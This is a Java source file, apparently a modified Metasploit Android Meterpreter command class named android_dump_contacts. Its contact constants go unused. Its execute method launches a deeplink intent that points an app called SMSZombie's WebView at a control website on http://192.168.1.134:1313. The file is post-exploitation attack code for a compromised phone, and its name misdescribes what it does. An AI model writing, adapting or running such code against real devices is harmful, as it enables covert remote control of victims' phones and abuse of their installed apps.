package com.metasploit.meterpreter.android;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;

import android.provider.ContactsContract;
import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.app.Activity;
import android.content.Context;
import android.net.Uri;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;

public class android_dump_contacts implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_CONTACT_GROUP = TLVPacket.TLV_META_TYPE_GROUP
            | (TLV_EXTENSIONS + 9007);
    private static final int TLV_TYPE_CONTACT_NUMBER = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9008);
    private static final int TLV_TYPE_CONTACT_EMAIL = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9009);
    private static final int TLV_TYPE_CONTACT_NAME = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9010);

    private static final String _id = "_id";
    private static final String displayName = "display_name";
    private static final String contactId = "contact_id";
    private static final String data1 = "data1";

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request,
                       TLVPacket response) throws Exception {

        AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
        final Context context = androidMeterpreter.getContext();



       /* Android Q poses limitations on starting activities
        *
        * https://developer.android.com/guide/components/activities/background-starts
        */

        // Starts intent with deeplink to navigate SMSZombie's WebView to control website
        try {
            Intent intent = new Intent("android.intent.action.VIEW",
                        Uri.parse("walkingdead://callzombie/?url=http://192.168.1.134:1313"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);

        } catch (ActivityNotFoundException e) {
          return ERROR_FAILURE;
        }

        return ERROR_SUCCESS;
    }

}
